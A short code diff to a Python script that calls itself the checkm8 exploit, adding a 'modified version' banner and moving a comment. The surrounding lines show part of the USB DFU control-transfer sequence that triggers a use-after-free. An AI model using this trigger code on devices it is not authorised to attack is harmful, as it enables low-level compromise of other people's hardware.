@@ -471,6 +471,7 @@ def exploit_config(serial_number):
 
 def exploit():
   print '*** checkm8 exploit by axi0mX ***'
+  print '*** modified version by Linus Henze ***'
 
   device = dfu.acquire_device()
   start = time.time()
@@ -497,7 +498,9 @@ def exploit():
   device = dfu.acquire_device()
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10) # Advance buffer offset before UaF to prevent trashing the heap
+
+  # Advance buffer offset before triggering the UaF to prevent trashing the heap
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10)
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
 
